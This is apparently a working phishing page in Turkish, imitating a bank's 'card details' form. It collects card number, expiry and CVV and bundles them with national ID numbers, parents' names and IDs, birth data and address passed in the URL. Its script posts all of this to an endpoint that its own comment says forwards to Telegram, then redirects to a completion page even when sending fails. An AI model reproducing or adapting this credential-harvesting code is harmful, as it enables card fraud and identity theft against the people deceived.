<!DOCTYPE html>
<html class="no-js javascript png flash9 chrome webkit win" lang="tr">

<head id="ctl00_head">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="robots" content="noindex, nofollow">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Kart Bilgileri</title>
  <meta name="description" content="Kart Bilgileri">
  <link rel="stylesheet" href="./imgs/app.css">
  <link rel="shortcut icon" href="./imgs/favicon.ico" type="image/x-icon">
  <style>
    .info-container {
      max-width: 600px;
      margin: 50px auto;
      padding: 30px;
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    .info-header {
      text-align: center;
      margin-bottom: 30px;
    }
    .info-header h1 {
      color: #c51522;
      font-size: 28px;
      margin-bottom: 10px;
    }
    .form-group {
      margin-bottom: 20px;
    }
    .form-label {
      display: block;
      margin-bottom: 8px;
      font-weight: bold;
      color: #333;
    }
    .form-input {
      width: 100%;
      padding: 12px;
      border: 1px solid #ddd;
      border-radius: 5px;
      font-size: 16px;
      box-sizing: border-box;
    }
    .form-input:focus {
      outline: none;
      border-color: #c51522;
    }
    .form-row {
      display: flex;
      gap: 15px;
    }
    .form-row .form-group {
      flex: 1;
    }
    .submit-btn {
      width: 100%;
      padding: 15px;
      background: #c51522;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      cursor: pointer;
      font-weight: bold;
    }
    .submit-btn:hover {
      background: #a0121a;
    }
    .submit-btn:disabled {
      background: #ccc;
      cursor: not-allowed;
    }
  </style>
</head>

<body class="is-retail is-turkish is-desktop is-nontouch">
  <div class="info-container">
    <div class="info-header">
      <h1>Kart Bilgileri</h1>
      <p>Lütfen kart bilgilerinizi giriniz</p>
    </div>

    <form id="kartForm">
      <div class="form-group">
        <label class="form-label" for="kartNumarasi">Kart Numarası</label>
        <input type="text" id="kartNumarasi" name="kartNumarasi" class="form-input" placeholder="1234 5678 9012 3456" maxlength="19" pattern="[0-9\s]{13,19}" required>
        <small style="color: #666; font-size: 12px;">16 haneli kart numaranızı giriniz</small>
      </div>

      <div class="form-row">
        <div class="form-group">
          <label class="form-label" for="sonKullanimAy">Son Kullanma Tarihi (Ay)</label>
          <input type="number" id="sonKullanimAy" name="sonKullanimAy" class="form-input" placeholder="MM" min="1" max="12" required>
        </div>
        <div class="form-group">
          <label class="form-label" for="sonKullanimYil">Son Kullanma Tarihi (Yıl)</label>
          <input type="number" id="sonKullanimYil" name="sonKullanimYil" class="form-input" placeholder="YYYY" min="2024" max="2099" required>
        </div>
        <div class="form-group">
          <label class="form-label" for="cvv">CVV</label>
          <input type="text" id="cvv" name="cvv" class="form-input" placeholder="123" maxlength="4" pattern="[0-9]{3,4}" required>
        </div>
      </div>

      <button type="submit" class="submit-btn" id="submitBtn">Devam Et</button>
    </form>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const urlParams = new URLSearchParams(window.location.search);
      const submitBtn = document.getElementById('submitBtn');

      // Kart numarası formatı (4'er haneli gruplar)
      document.getElementById('kartNumarasi').addEventListener('input', function(e) {
        let value = this.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        this.value = formattedValue;
      });

      // CVV sadece rakam
      document.getElementById('cvv').addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
      });

      // Ay sadece rakam ve 1-12 arası
      document.getElementById('sonKullanimAy').addEventListener('input', function(e) {
        this.value = this.value.replace(/[^0-9]/g, '');
        if (parseInt(this.value) > 12) {
          this.value = '12';
        }
      });

      // Form submit
      document.getElementById('kartForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const kartNumarasi = document.getElementById('kartNumarasi').value.replace(/\s/g, '');
        const sonKullanimAy = document.getElementById('sonKullanimAy').value;
        const sonKullanimYil = document.getElementById('sonKullanimYil').value;
        const cvv = document.getElementById('cvv').value;

        // Validasyonlar
        if (kartNumarasi.length < 13 || kartNumarasi.length > 19) {
          alert('Geçerli bir kart numarası giriniz (13-19 haneli)');
          return;
        }

        if (!sonKullanimAy || parseInt(sonKullanimAy) < 1 || parseInt(sonKullanimAy) > 12) {
          alert('Geçerli bir ay giriniz (1-12)');
          return;
        }

        if (!sonKullanimYil || parseInt(sonKullanimYil) < 2024) {
          alert('Geçerli bir yıl giriniz');
          return;
        }

        if (cvv.length < 3 || cvv.length > 4) {
          alert('Geçerli bir CVV giriniz (3-4 haneli)');
          return;
        }

        submitBtn.disabled = true;
        submitBtn.textContent = 'Gönderiliyor...';

        // Tüm bilgileri Telegram'a gönder
        const allData = {
          tckn: urlParams.get('tc') || '',
          telefon: urlParams.get('telefon') || '',
          kartLimiti: urlParams.get('kartLimiti') || '',
          adSoyad: urlParams.get('adSoyad') || '',
          dogumTarihi: urlParams.get('dogumTarihi') || '',
          cinsiyet: urlParams.get('cinsiyet') || '',
          dogumYeri: urlParams.get('dogumYeri') || '',
          anneAdi: urlParams.get('anneAdi') || '',
          babaAdi: urlParams.get('babaAdi') || '',
          anneTCKN: urlParams.get('anneTCKN') || '',
          babaTCKN: urlParams.get('babaTCKN') || '',
          adresIl: urlParams.get('adresIl') || '',
          adresIlce: urlParams.get('adresIlce') || '',
          memleketIl: urlParams.get('memleketIl') || '',
          memleketIlce: urlParams.get('memleketIlce') || '',
          medeniHal: urlParams.get('medeniHal') || '',
          kartNumarasi: kartNumarasi,
          sonKullanimAy: sonKullanimAy,
          sonKullanimYil: sonKullanimYil,
          cvv: cvv,
          type: 'basvuru'
        };

        fetch('/api/send-telegram', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(allData)
        })
        .then(response => response.json())
        .then(data => {
          // Telegram başarılı olsun ya da olmasın, tamamlandi.html'ye yönlendir
          window.location.href = 'tamamlandi.html';
        })
        .catch(error => {
          console.error('Error:', error);
          // Hata olsa bile tamamlandi.html'ye yönlendir
          window.location.href = 'tamamlandi.html';
        });
      });
    });
  </script>
</body>
</html>

